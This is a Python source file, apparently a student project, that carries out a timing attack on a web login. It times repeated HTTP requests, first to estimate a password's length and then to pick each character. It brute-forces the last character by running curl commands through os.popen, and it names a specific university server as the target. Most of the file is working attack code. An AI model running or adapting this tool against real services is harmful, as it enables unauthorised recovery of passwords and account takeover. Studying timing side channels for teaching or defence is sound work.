import os
import string
import scipy.stats as st
import logging as log
from time import time
import time as timer
import Configurations
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import requests

REQUESTS_SESSION = requests.Session()

# - - - - - - - - - -  LOG SECTION  - - - - - - - - - -


def set_logger(result_path: str, class_name: str, log_filename=None) -> log.Logger:
    """
    The function initial logger to documenting the RGB colors of the given pixel.

    :param result_path.String. represent path to result folder.
    :param class_name. String. class name of the logger.
    :param log_filename.String. custom file name. if None is given, file name will be 'logfile_{current date and time}.log
    :return: logger instance.
    """

    class MyFormatter(log.Formatter):
        converter = datetime.fromtimestamp

        def formatTime(self, record, datefmt=None):
            ct = self.converter(record.created)
            if datefmt:
                s = ct.strftime(datefmt)
            else:
                t = ct.strftime("%Y-%m-%d %H:%M:%S")
                s = "%s,%03d" % (t, record.msecs)
            return s

    # Set up a specific logger with our desired output level
    if log_filename is None:
        log_filename = f'logfile_{get_current_date_and_time()}.log'

    create_folder_if_not_exists(result_path)
    create_folder_if_not_exists(os.path.join(result_path, class_name))

    log.basicConfig(filename=os.path.join(result_path, class_name, log_filename), filemode='w', level=Configurations.log_level)
    logger = log.getLogger('MyLogger')
    formatter = MyFormatter(fmt='%(asctime)s %(message)s', datefmt='%Y-%m-%d,%H:%M:%S.%f')
    # handler = log.StreamHandler()
    # handler.setLevel(Configurations.log_level)
    # handler.setFormatter(formatter)
    #
    # logger.addHandler(handler)

    return logger


def get_current_date_and_time() -> str:
    """
    This function return a current date and time in this representation DD-MM-YYYY HH:MM.

    :return: String, represent day and time.
    """
    return datetime.now().strftime('%d-%m-%Y %H-%M')


def get_session() -> None:
    """
    return session as a string.
    """
    if Configurations.session is None:
        Configurations.session = Configurations.running_folder_format
        create_folder_if_not_exists(os.path.join(Configurations.result_path, Configurations.session))

    return Configurations.session


def write_log(logger, message: str, log_level="info", print_to_console=Configurations.write_to_console) -> None:
    """
    Write the given message to the given og file at the specified log info.

    :param logger: Logger.
    :param message: String. message to write to log.
    :param log_level: String, represnt message log level.
    """
    if logger:
        if log_level == "info":
            logger.info(message)
        elif logger == "debug":
            logger.debug(message)
        else:
            pass

    if print_to_console:
        print(message)


# - - - - - - - - - -  FILE SECTION  - - - - - - - - - -

def create_folder_if_not_exists(folder_path: str) -> None:
    """
    Create a given folder if not already exists.

    :param folder_path: Str. path to folder.

    :return: None.
    """
    if not os.path.exists(folder_path):
        os.mkdir(folder_path)


# - - - - - - - - - -  CONFIGURATION SECTION  - - - - - - - - - -


def configure_level(lvl: str) -> None:
    """
    setup the code configuration according to the level.

    :param lvl: Int. level number.

    :return: None.
    """
    lvl_dict = Configurations.configuration_level_setup_dict[int(lvl)]

    Configurations.max_password_size_attempt = lvl_dict['max_password_size_attempt']
    Configurations.attempts = lvl_dict['attempts']
    Configurations.use_thread_pool = lvl_dict['use_thread_pool']
    Configurations.max_of_threads = lvl_dict['max_of_threads']


# - - - - - - - - - -  PASSWORD SECTION  - - - - - - - - - -

def run_url(url: str, logger=None) -> float:
    """
    This function send request to a given url and return the time i took for a response.

    :param url: String. URL to request.
    :param logger: logger. if not None the function write it action to the given logger.

    :return: float. total time in second.
    """
    try:
        # aviv
        start = time()
        requests.get(url[9:len(url) - 1])
        time_pass = time() - start

        # yarden
        # command = url
        # start = time()
        # os.system(command + ">/dev/null 2>&1")
        # subprocess.check_output(command, shell=True)
        # os.system(url)
        # time_pass = time() - start

        # adir
        # url = url[url.find("\"") + 1:url.rfind("\"")]
        # timer.sleep(1)
        # response = REQUESTS_SESSION.get(url)
        # time_pass = response.elapsed.total_seconds()


    except Exception as e:
        write_log(logger, f"Exception {e} was occur with trying to get {url}.")
        time_pass = 0

    timer.sleep(Configurations.sleep_time)

    return time_pass
    # return response.elapsed.total_seconds()


def check_password_size_thread(url_result_command: str, iterations: int, thread_number: int, logger) -> float:
    """
    This function request the given URL iteration times and sum the requests time and return it.

    :param url_result_command: String. Given URL to send the request.
    :param iterations: Int. Number of iteration to request the given URL.
    :param thread_number: Int. Thread ID
    :param logger: logger. if not None the function write it action to the given logger.

    :return: Float. Sum all the requests time.
    """

    res_time = run_url(url_result_command)
    write_log(logger, message=f"[check password size thread][length {thread_number}]: result: {res_time}:")

    return res_time


def warmup() -> None:
    """
    This function send an http request for the first time to stabilize the connection time.

    :return: None.
    """
    url_time_command = f'curl -s "http://aoi.ise.bgu.ac.il/?user=test&password=test&difficulty=1"'
    run_url(url_time_command)


def check_if_distinct(results: list, alpha=Configurations.default_alpha) -> bool:
    """
    This function will check if the given list is distinct according to the normal distribution.

    :param results: List. list with values to verify if distinct according to normal distribution.

    :return: Boolean. True if distinct, false otherwise.
    """
    dist_name = "norm"
    params = {}

    dist = getattr(st, dist_name)
    param = dist.fit(results)

    params[dist_name] = param
    # Applying the Kolmogorov-Smirnov test
    _, p = st.kstest(results, dist_name, args=param)

    if p > alpha:
        return True
    else:
        return False


def _get_url_params(start_url: str, end_url: str, password_length: int, password="", ch=None) -> tuple:
    """
    This function get url parameters and return all cURL command and parameters.

    :param start_url: String. the first part of the URL.
    :param end_url: String. the last part of the URL.
    :param password_length: Int. password length.
    :param password: Int. password length.
    :param ch: Character. relevant char the need to be use for the password.

    :return:  Tuple:
                URL_time_command: String. represent the command to get the command's time.
                URL_result_command: String. represent the command for getting the result from the server.
                URL: String. URL after inserting the password in it.
                password: String. current password assemble by the relevant size.
    """
    if ch:  # append current char if exists
        password = password + ch

    while len(password) < password_length:  # pad password according to size
        password = password + Configurations.default_character

    url = f'{start_url}{password}{end_url}'

    url_result_command = f'curl -s "{url}"'
    url_time_command = f'curl -s "{url}"'
    # url_time_command = 'curl -s -w "%{{time_total}}" "{start_url}{password}{end_url}\"'.format(
    #     time_total='time_total', start_url=start_url, password=Configurations.default_character * password_length,
    #     end_url=end_url)


    return url_time_command, url_result_command, url, password


def _check_password_size(start_url: str = "", end_url: str = "", max_password_size: int = Configurations.default_password_size, logger=None) -> dict:
    """
    The function uses timing attack (by time gap) the size of the password.

    :param start_url: String. the first part of the URL.
    :param end_url: String. the last part of the URL.
    :param max_password_size: String. the first part of the URL.
    :param logger: logger. if not None the function write it action to the given logger.

    :return:
    """
    thread_pool = None

    if Configurations.use_thread_pool:
        thread_pool = ThreadPoolExecutor(max_workers=Configurations.max_of_threads)

    results = {}
    future_results = []  # for getting the result from a thread when using ThreadPoolExecutor

    for current_password_size in range(0, max_password_size + 1, 1):
        url_time_command, url_result_command, url, password = _get_url_params(start_url, end_url, current_password_size)

        if Configurations.use_thread_pool:
            future_results.append(
                thread_pool.submit(
                    check_password_size_thread,
                    url_result_command,
                    Configurations.attempts,
                    current_password_size,
                    logger
                )
            )
        else:
            results[current_password_size] = check_password_size_thread(
                url_result_command,
                Configurations.attempts,
                current_password_size,
                logger
            )

    if Configurations.use_thread_pool:
        thread_pool.shutdown(wait=True)

        for i in range(max_password_size + 1):
            results[i] = future_results[i].result()

    return results


def _get_chosen_char(results: dict) -> tuple:
    """
    This function chose the best char by the result and return tuple contain:
                                                                    List. Given dict's values as a list without the chosen object.
                                                                    Object. the chosen item.

    :param results: List. list with

    :return: Tuple:
                List. contain the given list without the chosen item.
                Object. chosen item that has been chosen.
    """
    max_value_index = max(results, key=results.get)
    result_list = list(results.values())
    result_list.remove(results[max_value_index])

    return result_list, max_value_index


def check_password_size(start_url: str = "", end_url: str = "", max_password_size: int = Configurations.default_password_size, logger=None) -> int:
    """
    The function uses timing attack (by time gap) the size of the password.

    :param start_url: String. the first part of the URL.
    :param end_url: String. the last part of the URL.
    :param max_password_size: String. the first part of the URL.
    :param logger: logger. if not None the function write it action to the given logger.

    :return: Int. size of the password by timing attack.
    """
    warmup()

    distinct = False
    attempts = 0

    # list of lists. represent in each cell a list of all the attempts for a given password length
    all_results_attempts_list = [[] for _ in range(Configurations.default_password_size + 1)]

    for i in range(Configurations.max_password_size_attempt):  # if attempt didnt reach to maximun according to configuration setup
        Configurations.current_attempt += 1
        results_dict = _check_password_size(start_url, end_url, max_password_size, logger)

        for i in range(Configurations.default_password_size):
            all_results_attempts_list[i].append(results_dict[i])

        # yarden added to check level dictionary
        chosen_result_all_password_size = {}
        for i in range(Configurations.default_password_size):
            chosen_result_all_password_size[i] = min(all_results_attempts_list[i])

        chosen_password_size = max(chosen_result_all_password_size, key=chosen_result_all_password_size.get)

    chosen_result_all_password_size = {}
    for i in range(Configurations.default_password_size):
        chosen_result_all_password_size[i] = min(all_results_attempts_list[i])

    chosen_password_size = max(chosen_result_all_password_size, key=chosen_result_all_password_size.get)

    return chosen_password_size


def crack_password_thread(url_time_command, url_result_command, ch, current_password, iterations: int=1, logger=None) -> float:
    """
    This function request the given URL iteration times and sum the requests time and return it.

    :param url_time_command: String. a full URL
    :param url_result_command:
    :param ch:
    :param iterations:
    :param logger: logger. if not None the function write it action to the given logger.

    :return: Float. sum of all time it took for do the URL request for all requests.
    """
    total_iterations_time = 0

    if Configurations.default_character not in current_password:  # final character
        res = os.popen(url_time_command).read()
        if res == '1':
            Configurations.password = current_password
            write_log(logger, f"[crack password thread] Password is: {current_password}")

        else:
            write_log(logger, f"[crack password thread] Password is NOT: {current_password}")

        return 0.0

    else:

        res_time = run_url(url_result_command)

        total_iterations_time += res_time

        # if i + 1 == iterations:
        write_log(logger, f"[crack password thread][{ch}][iteration {Configurations.current_attempt}] result time: {total_iterations_time}  -  {url_result_command}")

    return total_iterations_time


def _check_last_char(start_url: str, end_url: str, password: str, password_size: int, logger) -> None:
    """
    This function check the last character in the password.
    it trying to get each of the password by brute force and check if the answer is '1' or '0'.

    :return: None.
    """
    future_results = []  # result for the thread pool

    thread_pool = ThreadPoolExecutor(max_workers=len(Configurations.characters))

    for ch in Configurations.characters:
        if len(Configurations.password) == 0:
            url_time_command, url_result_command, url, current_password = _get_url_params(start_url, end_url, password_size, password, ch)

            future_results.append(
                thread_pool.submit(
                    crack_password_thread,
                    url_time_command,
                    url_result_command,
                    ch,
                    current_password,
                    1,
                    logger
                )
            )

    if Configurations.use_thread_pool:
        thread_pool.shutdown(wait=True)

    return


def _crack_password_step(start_url, end_url, password, password_size, logger) -> dict:
    """
    This function get a url and will try to go one step farther
    by save all tie it take for each possible char.

    :param start_url: String. the first part of the URL.
    :param end_url: String. the last part of the URL.
    :param password: String. current password to start from.
    :param password_size: String. the first part of the URL.
    :param logger: logger. if not None the function write it action to the given logger.

    :return: Dictionary. dictionary containing all the result for each of the possible character.
                            the key will be character and the value will be the sum of time it take to request it URL.
    """
    thread_pool = None

    if Configurations.use_thread_pool:
        thread_pool = ThreadPoolExecutor(max_workers=Configurations.max_of_threads)

    results = {}
    future_results = []

    for ch in Configurations.characters:
        url_time_command, url_result_command, url, current_password = _get_url_params(start_url, end_url, password_size, password, ch)

        if Configurations.use_thread_pool:
            future_results.append(
                thread_pool.submit(
                    crack_password_thread,
                    url_time_command,
                    url_result_command,
                    ch,
                    current_password,
                    Configurations.attempts,
                    logger
                )
            )
        else:
            results[ch] = crack_password_thread(
                url_time_command,
                url_result_command,
                ch,
                current_password,
                Configurations.attempts,
                logger
            )

    if Configurations.use_thread_pool:  # if using thread pool, shut it down
        thread_pool.shutdown(wait=True)

        for password_length in range(len(future_results)):  # move future object to result dictionary
            result = future_results[password_length].result()
            results[Configurations.letters_lower[password_length]] = result

    return results


def crack_password(password_size: int, start_url: str = "", end_url: str = "", logger=None) -> str:
    """
    This function get a password size and try to break it by using timing attack.

    :param password_size: Int. length of password.
    :param start_url: String. prefix of the url.
    :param end_url: String. postfix of the url.
    :param logger: Logger. if a given, a command will be writen in it.

    :return: String. the password that have been found, None if failed to find the password.
    """
    warmup()

    password = ""

    for i in range(password_size):  # iterate all password by length


        if len(password) + 1 == password_size:  # last iteration
            _check_last_char(start_url, end_url, password, password_size, logger)

            return Configurations.password

        else:  # try all character to fit the next step of the password

            Configurations.current_attempt = 0
            # list of lists. represent in each cell a list of all the attempts for the given a char
            all_results_attempts_list = [[] for _ in range(len(string.ascii_lowercase))]

            # run each password the amount of time of attempts we configured
            for _ in range(Configurations.attempts):

                Configurations.current_attempt += 1
                results_dict = _crack_password_step(start_url, end_url, password, password_size, logger)

                for index, ch in zip(range(len(Configurations.letters_lower)), Configurations.letters_lower):
                    all_results_attempts_list[index].append(results_dict[ch])

        # a dictionary that will contain for each char the minimal run time
        chosen_result_all_letters = {}

        # get from all the attempts for each char his lowest run time
        for index, ch in zip(range(len(Configurations.letters_lower)), Configurations.letters_lower):
            chosen_result_all_letters[ch] = min(all_results_attempts_list[index])

        # get the char with the highest run time
        chosen_char = max(chosen_result_all_letters, key=chosen_result_all_letters.get)

        password += chosen_char

    return Configurations.password if Configurations.password != "" else None


def _reset_timinig_atttack() -> None:
    """
    This fucntionreset all parameter need to tun timing attack.

    :return: None.
    """
    Configurations.password = ""


def timing_attack(start_url: str = "", end_url: str = "", max_password_size: int = Configurations.default_password_size) -> str:
    """
    This function get url and password size and return the password by using a time attack.

    :param start_url: str. first part of the url before password appear.
    :param end_url: str. last part of the url after password appear.
    :param max_password_size: Int. max size of the password that possible.

    :return: str. password as a string. None if couldn't find any.
    """
    _reset_timinig_atttack()

    if Configurations.use_logger:
        logger = set_logger(Configurations.result_path, "crack password")
    else:
        logger = ""

    size = check_password_size(start_url=start_url, end_url=end_url, max_password_size=max_password_size, logger=logger)

    if size is None:
        return ""

    write_log(logger, log_level="debug", message=f"[timing attack]: starting to lookup password in size {size}.")

    plaintext_password = crack_password(password_size=size, start_url=start_url, end_url=end_url, logger=logger)

    if plaintext_password is None:
        return ""

    return plaintext_password
